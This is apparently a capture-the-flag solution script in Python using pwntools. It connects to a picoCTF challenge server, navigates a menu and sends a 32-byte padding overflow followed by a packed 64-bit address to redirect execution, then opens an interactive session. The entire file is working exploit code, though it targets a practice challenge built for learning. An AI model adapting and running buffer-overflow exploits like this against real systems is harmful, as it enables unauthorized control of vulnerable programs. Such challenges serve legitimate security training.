from pwn import *

HOST, PORT = "mimas.picoctf.net", 50401
r = remote(HOST, PORT)
# r = process('./chall')

r.recvuntil(b'choice: ')
r.sendline(b'2')
r.recvuntil(b'buffer: ')
r.sendline(b'A' * 32 + p64(0x4011a0))
r.sendline(b'4')

r.interactive()